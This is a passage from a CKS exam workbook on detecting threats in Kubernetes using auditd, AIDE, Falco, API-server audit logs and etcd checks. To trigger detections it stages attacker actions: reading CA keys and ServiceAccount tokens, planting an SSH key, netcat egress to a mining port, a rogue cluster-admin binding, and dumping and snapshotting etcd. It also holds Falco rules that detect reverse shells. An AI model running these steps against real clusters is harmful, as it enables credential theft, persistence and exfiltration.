# Guided Exercises — CKS 6.2: Detect Threats Within Physical Infrastructure, Apps, Networks, Data, Users and Workloads

> **Domain:** Monitoring, Logging and Runtime Security · **Exam weight of this task:** 4 % (domain total 20 %) · **Exam version:** CKS v1.34
>
> Domains 1–5 are about *stopping* things. This task is about *seeing* them. A cluster with perfect admission control and zero detection instrumentation is a cluster where a successful attack leaves no evidence at all. Your job in these exercises is to instrument every layer named in the curriculum, deliberately trip each detector, and then read the raw evidence a responder would actually get.

---

## Learning objectives

After completing these exercises you will be able to:

1. Enumerate the detection surface of a Kubernetes node and identify which curriculum layer is blind.
2. Instrument the **host / physical infrastructure** layer with `auditd` kernel rules and AIDE file-integrity baselines.
3. Instrument the **workload / app** layer with Falco: driver selection, custom rules, macros, lists, exceptions and `override` semantics.
4. Instrument the **user / identity** layer with a tiered kube-apiserver audit policy and hunt it with `jq`.
5. Instrument the **data** layer: Secret reads, projected ServiceAccount tokens, etcd plaintext and snapshot theft.
6. Instrument the **network** layer: dropped-flow verdicts, DNS tunnelling, reverse shells.
7. Detect containers and static Pods that the Kubernetes API never knew about.
8. Correlate all sources into a single attack timeline and score your coverage against MITRE ATT&CK for Containers.

---

## Lab topology and prerequisites

| Node | Role | Spec |
|---|---|---|
| `cks-cp` | control plane (kubeadm) | Ubuntu 24.04, 2 vCPU / 4 GiB, Kubernetes v1.34, containerd 2.x |
| `cks-w1` | worker | Ubuntu 24.04, 2 vCPU / 4 GiB, kernel ≥ 5.8 (required for Falco `modern_ebpf`) |

You need `root` (or passwordless `sudo`) **on both nodes over SSH**, plus a working `kubectl` with `cluster-admin`. A CNI that supports NetworkPolicy is assumed; Exercise 6 gives a Cilium path and a CNI-agnostic fallback.

```bash
# Sanity check before you start
kubectl get nodes -o wide
kubectl version --short
ssh cks-w1 'uname -r; systemctl is-active containerd'
```

> **Exam note.** In the real CKS environment Falco, `auditd` and the audit-log directories are usually already present, and there is **no internet access**. Exercise 3 shows the package install for a lab you build yourself; on the exam you skip straight to the rule-writing steps. Every path used below is the distribution default so it transfers directly.
>
> **Blast radius.** Exercise 4 edits the `kube-apiserver` static Pod. Snapshot your VM or back up `/etc/kubernetes/manifests/kube-apiserver.yaml` **outside** the manifests directory first. Never leave a `.bak`, `.swp` or `~` file inside `/etc/kubernetes/manifests/` — the kubelet will try to parse it.

---

## Exercise 1 — Map the detection surface and find the blind layer

Before writing a single rule, establish what evidence the cluster already produces. Detection engineering starts with an inventory, not with a tool.

### Steps

1. On the control plane, check whether the API server produces an audit log at all:

   ```bash
   ssh cks-cp
   sudo grep -E 'audit-(policy-file|log-path|log-format|log-maxage|log-maxbackup|log-maxsize|webhook-config-file)' \
     /etc/kubernetes/manifests/kube-apiserver.yaml || echo "NO AUDIT FLAGS PRESENT"
   ```

   On a stock kubeadm cluster you get:

   ```
   NO AUDIT FLAGS PRESENT
   ```

2. Check the kernel audit subsystem on both nodes:

   ```bash
   sudo systemctl is-active auditd
   sudo auditctl -s
   sudo auditctl -l
   ```

   ```
   active
   enabled 1
   failure 1
   pid 812
   rate_limit 0
   backlog_limit 8192
   lost 0
   backlog 0
   backlog_wait_time 60000
   loginuid_immutable 0 unlocked
   No rules
   ```

3. Check for a runtime-security sensor on the worker:

   ```bash
   ssh cks-w1 'command -v falco tetragon tracee 2>/dev/null; systemctl list-units --type=service --all | grep -Ei "falco|tetragon|tracee"'
   ```

4. Check the kubelet's own exposure — an unauthenticated kubelet API is both a vulnerability *and* a detection gap, because kubelet keeps no audit trail of its own:

   ```bash
   sudo grep -A4 -E 'authentication:|authorization:|readOnlyPort' /var/lib/kubelet/config.yaml
   # From another node, try the read/write port anonymously:
   curl -sk https://cks-w1:10250/pods | head -c 200; echo
   curl -sk http://cks-w1:10255/pods | head -c 200; echo
   ```

   A hardened kubelet answers:

   ```
   Unauthorized
   ```

5. Inventory the network observability plane:

   ```bash
   kubectl get pods -n kube-system -o wide | grep -Ei 'cilium|calico|weave|flannel'
   kubectl get networkpolicy -A
   which hubble cilium 2>/dev/null
   ```

6. Fill in this table for **your** cluster. Mark each cell `YES`, `NO` or `PARTIAL`:

   | Curriculum layer | Primary evidence source | Present? | Retained where? |
   |---|---|---|---|
   | Physical infrastructure / node | `auditd` + `journald` + file integrity | | |
   | Apps & workloads | syscall sensor (Falco / Tetragon / Tracee) | | |
   | Networks | CNI flow logs, DNS logs, NetworkPolicy verdicts | | |
   | Data | apiserver audit on `secrets`, etcd access auditing | | |
   | Users | apiserver audit `user`/`sourceIPs`/`userAgent` | | |
   | Workload identity | `serviceaccounts/token` audit, token file reads | | |

### Comprehension questions

- **Q1.1** — Your table shows `auditd` `active` but `auditctl -l` printed `No rules`. Is the physical-infrastructure layer instrumented? Justify.
- **Q1.2** — The API server has no `--audit-log-path`. Which *two* curriculum layers go completely dark because of that single missing flag?
- **Q1.3** — All detection evidence in a default cluster is written to the local disk of the node being attacked. Name the specific anti-forensic consequence and the architectural fix.
- **Q1.4** — `curl -sk https://cks-w1:10250/pods` returned a full Pod list. Beyond the obvious vulnerability, why is this *specifically* a detection problem rather than only a hardening problem?

---

## Exercise 2 — Physical infrastructure: kernel auditing and file integrity

The node is the layer with the highest blast radius and the weakest default instrumentation. Everything here runs on `cks-cp` and `cks-w1`.

### Steps

1. Write a detection-oriented audit rule set. Every rule carries a `-k` key, because the key is the only thing that makes the log queryable later:

   ```bash
   sudo tee /etc/audit/rules.d/70-cks-threats.rules >/dev/null <<'EOF'
   ## Reset and size the kernel audit buffers
   -D
   -b 8192
   -f 1
   --backlog_wait_time 60000

   ## Static Pod directory: any write here is arbitrary code as root on the node
   -w /etc/kubernetes/manifests/ -p wa -k k8s_static_pod

   ## Cluster PKI and admin kubeconfigs: READS matter here, not only writes
   -w /etc/kubernetes/pki/ -p rwa -k k8s_pki
   -w /etc/kubernetes/admin.conf -p rwa -k k8s_kubeconfig
   -w /root/.kube/config -p rwa -k k8s_kubeconfig

   ## etcd data directory: a read is a database theft
   -w /var/lib/etcd/ -p rwa -k etcd_data

   ## Runtime sockets: talking to these bypasses the API server entirely
   -w /run/containerd/containerd.sock -p rwa -k runtime_socket
   -w /var/run/docker.sock -p rwa -k runtime_socket

   ## Kernel module loading: LKM rootkits and eBPF-blinding
   -a always,exit -F arch=b64 -S init_module,finit_module,delete_module -k kernel_modules

   ## Container escape primitives
   -a always,exit -F arch=b64 -S setns -F auid>=1000 -F auid!=unset -k ns_escape
   -w /usr/bin/nsenter -p x -k ns_escape
   -w /usr/bin/crictl -p x -k runtime_cli
   -w /usr/local/bin/ctr -p x -k runtime_cli

   ## Node persistence
   -w /root/.ssh/ -p wa -k ssh_keys
   -w /etc/passwd -p wa -k identity
   -w /etc/shadow -p wa -k identity
   -w /etc/sudoers.d/ -p wa -k identity
   -w /etc/cron.d/ -p wa -k persistence
   -w /etc/systemd/system/ -p wa -k persistence
   EOF

   sudo augenrules --load
   sudo auditctl -l | head -20
   ```

2. Confirm the rules are live and note the counters:

   ```bash
   sudo auditctl -s
   ```

   ```
   enabled 1
   failure 1
   pid 812
   rate_limit 0
   backlog_limit 8192
   lost 0
   backlog 0
   ```

3. Trip three detectors deliberately:

   ```bash
   # (a) Static Pod injection
   sudo cp /etc/kubernetes/manifests/kube-proxy.yaml /tmp/x.yaml 2>/dev/null || echo "kind: Pod" | sudo tee /tmp/x.yaml
   sudo cp /tmp/x.yaml /etc/kubernetes/manifests/../audit-probe.yaml   # note: NOT inside manifests/

   # (b) PKI theft
   sudo cat /etc/kubernetes/pki/ca.key > /dev/null

   # (c) SSH key persistence
   echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIProbeKeyDoNotUse probe@lab" | sudo tee -a /root/.ssh/authorized_keys
   ```

4. Query by key — this is the workflow you must be able to reproduce under exam time pressure:

   ```bash
   sudo ausearch -k k8s_pki -i --start recent | head -30
   sudo ausearch -k ssh_keys -i --start today | grep -E 'proctitle|SYSCALL' | tail -5
   sudo aureport -k --summary
   ```

   ```
   ----
   type=PROCTITLE msg=audit(08/05/2026 12:55:31.442:2317) : proctitle=cat /etc/kubernetes/pki/ca.key
   type=PATH msg=audit(08/05/2026 12:55:31.442:2317) : item=0 name=/etc/kubernetes/pki/ca.key inode=262401 dev=fc:01 mode=file,600 ouid=root ogid=root
   type=CWD msg=audit(08/05/2026 12:55:31.442:2317) : cwd=/home/ubuntu
   type=SYSCALL msg=audit(08/05/2026 12:55:31.442:2317) : arch=x86_64 syscall=openat success=yes exit=3 a0=0xffffff9c items=1 ppid=4412 pid=4488 auid=ubuntu uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=7 comm=cat exe=/usr/bin/cat subj=unconfined key=k8s_pki
   ```

5. Build a file-integrity baseline with AIDE, scoped to what actually matters (a whole-root baseline is unusable noise on a Kubernetes node):

   ```bash
   sudo apt-get install -y aide-common   # skip on the exam; usually preinstalled

   sudo tee /etc/aide/cks.conf >/dev/null <<'EOF'
   database_in=file:/var/lib/aide/cks.db.gz
   database_out=file:/var/lib/aide/cks.db.new.gz
   gzip_dbout=yes
   report_url=stdout

   # p=perms i=inode n=links u=uid g=gid s=size m=mtime c=ctime + strong hashes
   K8S = p+i+n+u+g+s+m+c+sha256

   /etc/kubernetes                 K8S
   /var/lib/kubelet/config.yaml    K8S
   /opt/cni/bin                    K8S
   /usr/bin/kubelet                K8S
   /usr/bin/kubectl                K8S
   /usr/bin/crictl                 K8S
   /etc/systemd/system             K8S
   EOF

   sudo aide --config=/etc/aide/cks.conf --init
   sudo mv /var/lib/aide/cks.db.new.gz /var/lib/aide/cks.db.gz
   ```

6. Simulate tampering and detect it:

   ```bash
   sudo touch /etc/kubernetes/manifests/kube-scheduler.yaml     # ctime/mtime change only
   printf 'kind: Pod\n' | sudo tee /etc/kubernetes/audit-probe2.yaml >/dev/null
   sudo aide --config=/etc/aide/cks.conf --check
   ```

   ```
   Start timestamp: 2026-08-05 13:02:44 +0000 (AIDE 0.18.6)
   AIDE found differences between database and filesystem!!

   Summary:
     Total number of entries:  318
     Added entries:            1
     Removed entries:          0
     Changed entries:          1

   ---------------------------------------------------
   Added entries:
   ---------------------------------------------------
   f++++++++++++++++: /etc/kubernetes/audit-probe2.yaml

   ---------------------------------------------------
   Changed entries:
   ---------------------------------------------------
   f = ... mc.. : /etc/kubernetes/manifests/kube-scheduler.yaml
   ```

7. Clean up the probes (leave the audit rules in place, later exercises use them):

   ```bash
   sudo rm -f /etc/kubernetes/audit-probe.yaml /etc/kubernetes/audit-probe2.yaml
   sudo sed -i '/ProbeKeyDoNotUse/d' /root/.ssh/authorized_keys
   sudo aide --config=/etc/aide/cks.conf --init && sudo mv /var/lib/aide/cks.db.new.gz /var/lib/aide/cks.db.gz
   ```

### Comprehension questions

- **Q2.1** — Why is `/etc/kubernetes/pki/` watched with `-p rwa` while `/etc/kubernetes/manifests/` is watched with `-p wa`? What would you lose by using `-p wa` on the PKI directory?
- **Q2.2** — In the `ausearch` output above, `uid=root` but `auid=ubuntu`. Which field do you hand to an incident responder, and why is the other one nearly worthless in a compromise?
- **Q2.3** — The rule set does **not** end with `-e 2`. What does `-e 2` buy you, what does it cost operationally, and where in the file must it appear?
- **Q2.4** — AIDE stores hashes and metadata of `/etc/kubernetes/pki`, including private keys. Is that a secret-leak risk? What *is* the real risk with the AIDE database, and how do you mitigate it?
- **Q2.5** — `auditctl -s` shows `lost 0`. An attacker generates 200 000 file events per second on a watched path. Predict what happens to `lost`, to your evidence, and to the node — given `-f 1` and `--backlog_wait_time 60000`.

---

## Exercise 3 — Apps and workloads: Falco rules that catch real behaviour

### Steps

1. Install Falco on `cks-w1` (skip on the exam — it is preinstalled):

   ```bash
   ssh cks-w1
   curl -fsSL https://falco.org/repo/falcosecurity-packages.asc \
     | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
   echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" \
     | sudo tee /etc/apt/sources.list.d/falcosecurity.list
   sudo apt-get update && sudo apt-get install -y falco
   ```

2. Identify the driver actually in use — this determines what Falco can and cannot see:

   ```bash
   falco --version
   sudo grep -A3 '^engine:' /etc/falco/falco.yaml
   systemctl list-units 'falco*' --all --no-pager
   ```

   ```
   Falco version: 0.41.0 (x86_64)
   Driver:
     API version: 8.0.0
     Schema version: 2.0.0
   engine:
     kind: modern_ebpf
     modern_ebpf:
       cpus_for_each_buffer: 2
   falco-modern-bpf.service  loaded active running Falco: Container Native Runtime Security with modern ebpf
   ```

3. Inspect the rule pipeline before you add to it:

   ```bash
   sudo grep -A8 '^rules_files:\|^rules_file:' /etc/falco/falco.yaml
   sudo falco -L | grep -iE 'shell|sensitive|write below' | head
   sudo falco --list syscall | grep -E '^k8s\.|^container\.|^fd\.s' | head -20
   ```

4. Write a purpose-built rules file. Note the use of a `list`, two `macro`s, an inline `exception`, and MITRE tags:

   ```bash
   sudo tee /etc/falco/rules.d/cks-6.2-detections.yaml >/dev/null <<'EOF'
   - required_engine_version: 0.31.0

   - list: cks_allowed_token_readers
     items: [kubelet, kube-proxy, coredns, konnectivity-agent]

   - list: cks_mining_ports
     items: [3333, 4444, 5555, 7777, 14444, 45700]

   - macro: cks_token_path
     condition: fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount

   - macro: cks_bin_dirs
     condition: (fd.directory in (/bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin))

   - rule: ServiceAccount Token Read By Interactive Process
     desc: >
       A shell, HTTP client or file-dumping utility read the projected ServiceAccount
       token inside a container. Normal application SDKs read it too, so this rule is
       deliberately scoped to hands-on-keyboard tooling. MITRE T1552.001.
     condition: >
       open_read and container and cks_token_path
       and not proc.name in (cks_allowed_token_readers)
       and proc.name in (shell_binaries, http_clients, cat, head, tail, base64, xxd)
     output: >
       SA token read inside container (proc=%proc.name cmd=%proc.cmdline parent=%proc.pname
       file=%fd.name user=%user.name uid=%user.uid ns=%k8s.ns.name pod=%k8s.pod.name
       container=%container.name image=%container.image.repository:%container.image.tag)
     priority: CRITICAL
     tags: [container, k8s, credential-access, mitre_credential_access, T1552.001]
     exceptions:
       - name: sanctioned_debug_images
         fields: [k8s.ns.name, container.image.repository]
         comps: [=, =]
         values:
           - [sre-debug, docker.io/nicolaka/netshoot]

   - rule: Outbound Connection To Known Mining Port
     desc: Container opened egress to a port strongly associated with mining pools. MITRE T1496.
     condition: outbound and container and fd.sport in (cks_mining_ports)
     output: >
       Suspicious egress to mining port (proc=%proc.name cmd=%proc.cmdline
       dest=%fd.sip:%fd.sport ns=%k8s.ns.name pod=%k8s.pod.name image=%container.image.repository)
     priority: CRITICAL
     tags: [container, network, mitre_impact, T1496]

   - rule: Binary Written Below Container Bin Dir
     desc: Runtime drift - a new executable appeared in a system bin directory inside a container.
     condition: >
       open_write and container and cks_bin_dirs
       and not proc.name in (package_mgmt_binaries)
     output: >
       Runtime drift: write below bin dir (file=%fd.name proc=%proc.name cmd=%proc.cmdline
       ns=%k8s.ns.name pod=%k8s.pod.name image=%container.image.repository)
     priority: ERROR
     tags: [container, filesystem, mitre_persistence, T1543]

   - rule: STDIO Redirected To Network Socket In Container
     desc: A process duplicated stdin/stdout/stderr onto a socket - the reverse-shell signature.
     condition: >
       evt.type in (dup, dup2, dup3) and evt.dir=> and container
       and fd.num in (0, 1, 2) and fd.type in (ipv4, ipv6)
     output: >
       Reverse shell pattern (proc=%proc.name cmd=%proc.cmdline fd=%fd.name
       ns=%k8s.ns.name pod=%k8s.pod.name container=%container.name)
     priority: CRITICAL
     tags: [container, network, mitre_execution, T1059]
   EOF

   sudo falco --validate /etc/falco/rules.d/cks-6.2-detections.yaml
   ```

   ```
   Tue Aug  5 13:31:02 2026: Validating rules file(s):
   Tue Aug  5 13:31:02 2026:    /etc/falco/rules.d/cks-6.2-detections.yaml
   /etc/falco/rules.d/cks-6.2-detections.yaml: Ok
   ```

5. Tune an upstream rule instead of duplicating it. Silence `Terminal shell in container` only for a sanctioned break-glass namespace, using the modern `override` semantics:

   ```bash
   sudo tee /etc/falco/rules.d/cks-6.2-tuning.yaml >/dev/null <<'EOF'
   - rule: Terminal shell in container
     condition: and not k8s.ns.name = "sre-debug"
     override:
       condition: append
   EOF
   sudo falco --validate /etc/falco/rules.d/cks-6.2-tuning.yaml
   ```

6. Run Falco in the foreground for a bounded window so you can read raw JSON:

   ```bash
   sudo systemctl stop falco-modern-bpf
   sudo falco -M 180 -o json_output=true -o json_include_output_property=true \
        -o log_level=info --unbuffered
   ```

7. From a second terminal, generate the behaviour:

   ```bash
   kubectl create ns prod
   kubectl -n prod run payments --image=nicolaka/netshoot --restart=Never -- sleep 3600
   kubectl -n prod wait --for=condition=Ready pod/payments --timeout=60s

   kubectl -n prod exec -it payments -- sh -c '
     cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40; echo;
     cp /bin/busybox /usr/local/bin/kube-updater 2>/dev/null;
     timeout 3 nc -w1 198.51.100.77 4444 </dev/null;
     echo done'
   ```

8. Read what Falco produced. A single event looks like this (reformatted):

   ```json
   {
     "hostname": "cks-w1",
     "output": "13:41:07.883462001: Critical SA token read inside container (proc=cat cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token parent=sh file=/var/run/secrets/kubernetes.io/serviceaccount/token user=root uid=0 ns=prod pod=payments container=payments image=docker.io/nicolaka/netshoot:latest)",
     "output_fields": {
       "container.image.repository": "docker.io/nicolaka/netshoot",
       "container.name": "payments",
       "fd.name": "/var/run/secrets/kubernetes.io/serviceaccount/token",
       "k8s.ns.name": "prod",
       "k8s.pod.name": "payments",
       "proc.cmdline": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
       "proc.pname": "sh",
       "user.name": "root",
       "user.uid": 0
     },
     "priority": "Critical",
     "rule": "ServiceAccount Token Read By Interactive Process",
     "source": "syscall",
     "tags": ["T1552.001","container","credential-access","k8s","mitre_credential_access"],
     "time": "2026-08-05T13:41:07.883462001Z"
   }
   ```

9. Verify the exception works — the same command in the sanctioned namespace must be silent:

   ```bash
   kubectl create ns sre-debug
   kubectl -n sre-debug run probe --image=nicolaka/netshoot --restart=Never -- sleep 300
   kubectl -n sre-debug wait --for=condition=Ready pod/probe --timeout=60s
   kubectl -n sre-debug exec probe -- cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null
   ```

10. Restore the service and confirm alerts still land in the system log:

    ```bash
    sudo systemctl start falco-modern-bpf
    sudo journalctl -u falco-modern-bpf -f --since "2 min ago"
    ```

### Comprehension questions

- **Q3.1** — The upstream `Terminal shell in container` rule contains `proc.tty != 0`. Explain concretely which real attack this excludes, and why upstream still ships it that way.
- **Q3.2** — You wrote the tuning as a separate file with `override: {condition: append}`. What happens instead if you paste a second document with the same `rule:` name and **no** `override` key? What happens if you use the legacy `append: true` on Falco 0.41?
- **Q3.3** — In `Outbound Connection To Known Mining Port` the condition uses `fd.sport`, not `fd.cport`. Explain the Falco client/server field convention and what the rule would match if you swapped them.
- **Q3.4** — Your exception used `fields: [k8s.ns.name, container.image.repository]` with `comps: [=, =]`. Why is `k8s.ns.name` alone a dangerous exception key in a multi-tenant cluster?
- **Q3.5** — Falco with `modern_ebpf` traces syscalls. Name two classes of malicious activity on the node that this driver will **not** see, and say which tool from Exercise 2 covers each.
- **Q3.6** — In the JSON above, `user.name=root` and `user.uid=0`. Is that the *node's* root? Explain what Falco is actually reporting and why this matters when you triage.

---

## Exercise 4 — Users and identity: the API server audit log

### Steps

1. On `cks-cp`, create the policy directory and a tiered policy. The ordering matters: the **first matching rule wins**.

   ```bash
   ssh cks-cp
   sudo mkdir -p /etc/kubernetes/audit /var/log/kubernetes/audit

   sudo tee /etc/kubernetes/audit/policy.yaml >/dev/null <<'EOF'
   apiVersion: audit.k8s.io/v1
   kind: Policy
   omitStages:
     - RequestReceived
   omitManagedFields: true
   rules:
     # ---- 1. Drop the high-volume control-loop noise first ----
     - level: None
       users: ["system:kube-scheduler", "system:kube-controller-manager", "system:apiserver"]
       verbs: ["get", "list", "watch"]
     - level: None
       userGroups: ["system:nodes"]
       verbs: ["get", "list", "watch"]
     - level: None
       nonResourceURLs: ["/healthz*", "/readyz*", "/livez*", "/version", "/metrics", "/openapi/*"]

     # ---- 2. Identity layer: full body of every RBAC mutation ----
     - level: RequestResponse
       verbs: ["create", "update", "patch", "delete"]
       resources:
         - group: "rbac.authorization.k8s.io"
           resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
         - group: ""
           resources: ["serviceaccounts"]

     # ---- 3. Data layer: WHO touched WHICH credential object ----
     - level: Metadata
       resources:
         - group: ""
           resources: ["secrets", "configmaps"]
         - group: ""
           resources: ["serviceaccounts/token"]

     # ---- 4. Workload layer: hands-on-keyboard and privileged creation ----
     - level: Request
       resources:
         - group: ""
           resources: ["pods/exec", "pods/attach", "pods/portforward", "pods/ephemeralcontainers"]
     - level: Request
       verbs: ["create", "update", "patch"]
       resources:
         - group: ""
           resources: ["pods"]
         - group: "apps"
           resources: ["daemonsets", "deployments", "statefulsets"]

     # ---- 5. Everything else ----
     - level: Metadata
   EOF
   ```

2. Patch the static Pod. Add the flags to the container `command:` list:

   ```yaml
       - --audit-policy-file=/etc/kubernetes/audit/policy.yaml
       - --audit-log-path=/var/log/kubernetes/audit/audit.log
       - --audit-log-format=json
       - --audit-log-maxage=30
       - --audit-log-maxbackup=10
       - --audit-log-maxsize=100
   ```

   Add the mounts under `spec.containers[0].volumeMounts:`:

   ```yaml
       - name: audit-policy
         mountPath: /etc/kubernetes/audit
         readOnly: true
       - name: audit-log
         mountPath: /var/log/kubernetes/audit
         readOnly: false
   ```

   Add the volumes under `spec.volumes:`:

   ```yaml
     - name: audit-policy
       hostPath:
         path: /etc/kubernetes/audit
         type: DirectoryOrCreate
     - name: audit-log
       hostPath:
         path: /var/log/kubernetes/audit
         type: DirectoryOrCreate
   ```

   ```bash
   sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.bak  # NOT in manifests/
   sudo vi /etc/kubernetes/manifests/kube-apiserver.yaml
   ```

3. Watch the API server come back. It will be unreachable for 20–60 s:

   ```bash
   sudo crictl ps --name kube-apiserver
   until kubectl get --raw='/readyz' 2>/dev/null; do sleep 3; done; echo
   sudo ls -l /var/log/kubernetes/audit/
   ```

   If it never returns, the manifest is wrong. Read the runtime logs directly — `kubectl` is down, so `crictl` is the only way in:

   ```bash
   sudo crictl ps -a --name kube-apiserver -o json | jq -r '.containers[0].id'
   sudo crictl logs --tail 40 <container-id>
   sudo ls /var/log/pods/kube-system_kube-apiserver-cks-cp_*/kube-apiserver/
   ```

4. Generate the identity-layer signals you are going to hunt:

   ```bash
   # (a) anonymous probing
   curl -sk https://127.0.0.1:6443/api/v1/namespaces/kube-system/secrets | head -c 200; echo

   # (b) a low-privilege ServiceAccount trying to escalate
   kubectl -n prod create sa app-sa
   TOKEN=$(kubectl -n prod create token app-sa --duration=10m)
   APISERVER=https://127.0.0.1:6443
   curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets | jq -r '.message' 
   curl -sk -H "Authorization: Bearer $TOKEN" -A "python-requests/2.32.3" \
        $APISERVER/api/v1/namespaces/prod/pods | jq -r '.kind'

   # (c) hands on keyboard
   kubectl -n prod exec payments -- id

   # (d) a rogue cluster-admin binding
   kubectl create clusterrolebinding rogue-admin \
     --clusterrole=cluster-admin --serviceaccount=prod:app-sa

   # (e) impersonation
   kubectl get secrets -n kube-system --as=system:serviceaccount:prod:app-sa | head -3
   ```

5. Hunt. These `jq` one-liners are the core deliverable of this exercise:

   ```bash
   AUDIT=/var/log/kubernetes/audit/audit.log

   # 1. Anonymous identities
   sudo jq -c 'select(.user.username=="system:anonymous")
     | {t:.requestReceivedTimestamp, ip:.sourceIPs[0], uri:.requestURI, code:.responseStatus.code}' $AUDIT

   # 2. Authorization failures ranked by identity - the reconnaissance fingerprint
   sudo jq -r 'select(.responseStatus.code==403) | .user.username' $AUDIT | sort | uniq -c | sort -rn | head

   # 3. Every exec / attach / port-forward
   sudo jq -c 'select(.objectRef.subresource // "" | test("exec|attach|portforward"))
     | {t:.requestReceivedTimestamp, u:.user.username, ip:.sourceIPs[0],
        ns:.objectRef.namespace, pod:.objectRef.name, q:(.requestURI|split("?")[1])}' $AUDIT

   # 4. Secret access by non-system identities
   sudo jq -c 'select(.objectRef.resource=="secrets"
       and (.verb|test("^(get|list|watch)$"))
       and ((.user.username|startswith("system:")) | not))
     | {t:.requestReceivedTimestamp, u:.user.username, ns:.objectRef.namespace,
        name:(.objectRef.name // "ALL"), code:.responseStatus.code}' $AUDIT

   # 5. RBAC mutations - who granted what to whom
   sudo jq -c 'select(.objectRef.apiGroup=="rbac.authorization.k8s.io"
       and (.verb|test("create|update|patch|delete")))
     | {t:.requestReceivedTimestamp, u:.user.username, kind:.objectRef.resource,
        name:.objectRef.name, subjects:(.requestObject.subjects // []),
        role:(.requestObject.roleRef.name // null)}' $AUDIT

   # 6. Impersonation
   sudo jq -c 'select(.impersonatedUser != null)
     | {u:.user.username, as:.impersonatedUser.username, verb:.verb, uri:.requestURI}' $AUDIT

   # 7. User-Agent anomalies - SDK/CLI fingerprinting
   sudo jq -r 'select(.user.username|startswith("system:serviceaccount:"))
     | [.user.username, .userAgent] | @tsv' $AUDIT | sort | uniq -c | sort -rn | head

   # 8. Privileged Pod creation
   sudo jq -c 'select(.objectRef.resource=="pods" and .verb=="create"
       and ((.requestObject.spec.containers[]?.securityContext.privileged == true)
            or (.requestObject.spec.hostPID == true)
            or (.requestObject.spec.hostNetwork == true)))
     | {u:.user.username, ns:.objectRef.namespace,
        pod:.requestObject.metadata.name, node:.requestObject.spec.nodeName}' $AUDIT
   ```

   Expected shape of query 5:

   ```json
   {"t":"2026-08-05T14:07:55.113402Z","u":"kubernetes-admin","kind":"clusterrolebindings","name":"rogue-admin","subjects":[{"kind":"ServiceAccount","name":"app-sa","namespace":"prod"}],"role":"cluster-admin"}
   ```

6. Build a triage summary of the whole log:

   ```bash
   sudo jq -r '[.user.username, .verb, (.objectRef.resource // .requestURI), (.responseStatus.code|tostring)] | @tsv' $AUDIT \
     | sort | uniq -c | sort -rn | head -25
   ```

### Comprehension questions

- **Q4.1** — Query 8 returned nothing even though you created Pods. Then it worked after the policy edit in step 1 rule 4. Explain exactly which audit **level** populates `requestObject`, and what `Metadata` alone gives you.
- **Q4.2** — The policy logs `secrets` at `Metadata`, not `RequestResponse`. State the detection you give up, and the concrete reason `RequestResponse` on Secrets is usually the wrong call.
- **Q4.3** — `omitStages: [RequestReceived]` is set globally. What is a `RequestReceived` event, and what is the one investigation where dropping it hurts?
- **Q4.4** — Query 1 shows `system:anonymous` hits with `responseStatus.code: 403`, and other entries with `401`. What is the difference in what actually happened, and which one indicates anonymous auth is **enabled**?
- **Q4.5** — Query 7 shows `system:serviceaccount:prod:app-sa` with `userAgent: python-requests/2.32.3`. Why is that a stronger signal than the 403 in query 2, and what would the *benign* User-Agent for that SA look like?
- **Q4.6** — An attacker with node root wants to erase their API-server tracks. Given `--audit-log-maxsize=100` and `--audit-log-maxbackup=10`, describe the anti-forensic technique that needs **no** write access to the log file, and the architectural control that defeats it.

---

## Exercise 5 — Data: Secrets, projected tokens and etcd

### Steps

1. Create a Secret and observe how it looks to the data layer:

   ```bash
   kubectl -n prod create secret generic payments-db \
     --from-literal=username=svc_payments \
     --from-literal=password='Tr0ub4dor&3-PROD'
   ```

2. Check whether encryption at rest is configured, then read etcd directly. This is the single most convincing demo in the whole domain:

   ```bash
   ssh cks-cp
   sudo grep -E 'encryption-provider-config' /etc/kubernetes/manifests/kube-apiserver.yaml || echo "NO ENCRYPTION AT REST"

   sudo ETCDCTL_API=3 etcdctl \
     --endpoints=https://127.0.0.1:2379 \
     --cacert=/etc/kubernetes/pki/etcd/ca.crt \
     --cert=/etc/kubernetes/pki/etcd/server.crt \
     --key=/etc/kubernetes/pki/etcd/server.key \
     get /registry/secrets/prod/payments-db | hexdump -C | head -20
   ```

   ```
   00000000  2f 72 65 67 69 73 74 72  79 2f 73 65 63 72 65 74  |/registry/secret|
   00000010  73 2f 70 72 6f 64 2f 70  61 79 6d 65 6e 74 73 2d  |s/prod/payments-|
   ...
   000000f0  70 61 73 73 77 6f 72 64  12 10 54 72 30 75 62 34  |password..Tr0ub4|
   00000100  64 6f 72 26 33 2d 50 52  4f 44                    |dor&3-PROD|
   ```

3. Confirm the auditd tripwire from Exercise 2 fired on that etcd read, and on the client certificate read:

   ```bash
   sudo ausearch -k etcd_data -i --start recent | grep -E 'proctitle|key=' | tail -6
   sudo ausearch -k k8s_pki -i --start recent | grep proctitle | tail -3
   ```

4. Detect the highest-value exfiltration event of all — an etcd snapshot:

   ```bash
   sudo ETCDCTL_API=3 etcdctl \
     --endpoints=https://127.0.0.1:2379 \
     --cacert=/etc/kubernetes/pki/etcd/ca.crt \
     --cert=/etc/kubernetes/pki/etcd/server.crt \
     --key=/etc/kubernetes/pki/etcd/server.key \
     snapshot save /tmp/etcd-exfil.db

   sudo ETCDCTL_API=3 etcdctl --write-out=table snapshot status /tmp/etcd-exfil.db
   sudo ausearch -k k8s_pki -i --start recent | grep -c 'etcdctl'
   ```

5. Add a host-level Falco rule for this exact behaviour (it happens outside any container, so `container` must **not** be in the condition):

   ```bash
   ssh cks-w1  # or cks-cp, where etcd runs
   sudo tee /etc/falco/rules.d/cks-6.2-data.yaml >/dev/null <<'EOF'
   - macro: cks_etcd_data_dir
     condition: fd.name startswith /var/lib/etcd

   - rule: Etcd Data Directory Accessed By Non-Etcd Process
     desc: Something other than the etcd server touched the raw cluster database. MITRE T1005.
     condition: >
